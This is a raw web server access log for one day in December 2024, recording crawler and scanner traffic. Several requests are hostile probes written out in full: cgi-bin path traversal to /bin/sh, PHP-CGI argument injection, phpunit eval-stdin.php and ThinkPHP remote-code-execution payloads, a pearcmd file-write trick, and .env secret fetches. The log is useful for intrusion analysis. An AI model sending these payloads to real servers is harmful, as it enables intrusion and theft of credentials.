87.236.176.124 - - [13/Dec/2024:00:02:43 +0000] "GET / HTTP/1.1" 200 599 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
93.123.85.250 - - [13/Dec/2024:04:12:59 +0000] "POST / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.19.138.234 - - [13/Dec/2024:04:13:18 +0000] "GET / HTTP/1.1" 200 636 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
34.253.220.25 - - [13/Dec/2024:04:20:00 +0000] "GET /robots.txt HTTP/1.1" 404 488 "-" "Pandalytics/2.0 (https://domainsbot.com/pandalytics/)"
34.253.220.25 - - [13/Dec/2024:04:20:00 +0000] "GET / HTTP/1.1" 200 636 "-" "Pandalytics/2.0 (https://domainsbot.com/pandalytics/)"
93.123.85.250 - - [13/Dec/2024:04:26:37 +0000] "GET /.env HTTP/1.1" 404 434 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.250 - - [13/Dec/2024:04:26:37 +0000] "POST / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.250 - - [13/Dec/2024:04:31:13 +0000] "GET /.env HTTP/1.1" 404 434 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.250 - - [13/Dec/2024:04:31:13 +0000] "POST / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.55.79 - - [13/Dec/2024:04:31:18 +0000] "GET / HTTP/1.1" 200 636 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
144.76.68.88 - - [13/Dec/2024:04:48:16 +0000] "GET /robots.txt HTTP/1.1" 404 488 "-" "serpstatbot/2.1 (advanced backlink tracking bot; https://serpstatbot.com/; abuse@serpstatbot.com)"
144.76.68.88 - - [13/Dec/2024:04:48:16 +0000] "GET / HTTP/1.1" 200 635 "-" "serpstatbot/2.1 (advanced backlink tracking bot; https://serpstatbot.com/; abuse@serpstatbot.com)"
198.235.24.104 - - [13/Dec/2024:05:01:32 +0000] "\x16\x03\x01" 400 483 "-" "-"
198.235.24.104 - - [13/Dec/2024:05:01:33 +0000] "\x16\x03\x01" 400 483 "-" "-"
120.224.169.28 - - [13/Dec/2024:05:03:45 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 485 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:46 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 485 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:46 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 490 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:47 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:47 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:47 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:48 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:48 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:49 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:49 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:50 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:50 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:50 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:50 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:51 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:51 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:51 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:52 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:53 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:53 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:54 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:54 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:55 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:56 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:56 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:56 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:57 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:58 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:58 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:58 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:59 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:03:59 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:00 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:00 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:00 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:01 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:01 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:01 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:02 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:02 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:02 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:03 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:03 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:03 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
120.224.169.28 - - [13/Dec/2024:05:04:04 +0000] "GET /containers/json HTTP/1.1" 404 489 "-" "Custom-AsyncHttpClient"
80.82.77.202 - - [13/Dec/2024:05:10:31 +0000] "GET / HTTP/1.0" 200 711 "-" "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre"
143.110.222.166 - - [13/Dec/2024:05:12:54 +0000] "GET / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
178.79.141.160 - - [13/Dec/2024:05:30:51 +0000] "GET / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
178.79.141.160 - - [13/Dec/2024:05:30:51 +0000] "\x16\x03\x01" 400 483 "-" "-"
178.79.141.160 - - [13/Dec/2024:05:30:51 +0000] "\x16\x03\x01" 400 483 "-" "-"
178.79.141.160 - - [13/Dec/2024:05:30:51 +0000] "\x16\x03\x01" 400 483 "-" "-"
87.120.115.34 - - [13/Dec/2024:05:35:33 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 453 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
95.214.53.91 - - [13/Dec/2024:05:38:48 +0000] "GET / HTTP/1.1" 200 636 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.181.179 - - [13/Dec/2024:05:46:05 +0000] "\x16\x03\x01" 400 483 "-" "-"
79.10.250.228 - - [13/Dec/2024:05:46:45 +0000] "GET / HTTP/1.0" 200 711 "-" "-"
93.123.85.250 - - [13/Dec/2024:05:51:42 +0000] "GET /.env HTTP/1.1" 404 434 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.250 - - [13/Dec/2024:05:51:46 +0000] "POST / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [13/Dec/2024:06:09:36 +0000] "GET / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
95.214.53.205 - - [13/Dec/2024:06:13:51 +0000] "GET / HTTP/1.1" 200 692 "-" "-"
5.152.238.1 - - [13/Dec/2024:06:15:42 +0000] "GET / HTTP/1.1" 200 692 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
181.49.205.58 - - [13/Dec/2024:06:23:47 +0000] "GET /admin/config.php HTTP/1.0" 404 453 "-" "xfa1"
185.191.126.248 - - [13/Dec/2024:06:31:34 +0000] "GET / HTTP/1.1" 200 692 "-" "-"
143.110.222.166 - - [13/Dec/2024:07:10:17 +0000] "GET / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
95.214.53.205 - - [13/Dec/2024:07:23:49 +0000] "GET / HTTP/1.1" 200 692 "-" "-"
95.214.55.43 - - [13/Dec/2024:07:36:08 +0000] "GET / HTTP/1.1" 200 636 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.213.187.122 - - [13/Dec/2024:07:46:28 +0000] "GET /login.rsp HTTP/1.1" 404 453 "-" "Hello World"
43.153.58.28 - - [13/Dec/2024:07:59:26 +0000] "GET / HTTP/1.1" 200 599 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
103.125.190.146 - - [13/Dec/2024:08:08:16 +0000] "GET /.env HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
103.125.190.146 - - [13/Dec/2024:08:08:17 +0000] "POST / HTTP/1.1" 200 636 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
143.110.222.166 - - [13/Dec/2024:08:08:21 +0000] "GET / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.82.77.202 - - [13/Dec/2024:08:26:36 +0000] "GET / HTTP/1.0" 200 711 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
65.49.1.21 - - [13/Dec/2024:08:28:32 +0000] "GET / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
65.49.1.22 - - [13/Dec/2024:08:30:37 +0000] "GET /favicon.ico HTTP/1.1" 200 15333 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
65.49.1.13 - - [13/Dec/2024:08:30:56 +0000] "GET /geoserver/web/ HTTP/1.1" 404 434 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
129.226.35.202 - - [13/Dec/2024:08:35:42 +0000] "GET / HTTP/1.0" 200 711 "-" "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"
129.226.35.202 - - [13/Dec/2024:08:35:43 +0000] "\x16\x03" 400 483 "-" "-"
129.226.35.202 - - [13/Dec/2024:08:35:43 +0000] "\x16\x03" 400 483 "-" "-"
87.120.127.198 - - [13/Dec/2024:08:47:34 +0000] "GET /.env HTTP/1.1" 404 453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36"
95.214.53.205 - - [13/Dec/2024:08:56:09 +0000] "GET / HTTP/1.1" 200 692 "-" "-"
162.216.149.39 - - [13/Dec/2024:09:00:04 +0000] "GET / HTTP/1.1" 200 580 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
143.110.222.166 - - [13/Dec/2024:09:03:28 +0000] "GET / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
117.194.252.83 - - [13/Dec/2024:09:24:43 +0000] "GET / HTTP/1.1" 200 692 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.61.146.184 - - [13/Dec/2024:09:35:12 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
143.110.222.166 - - [13/Dec/2024:10:12:39 +0000] "GET / HTTP/1.1" 200 580 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
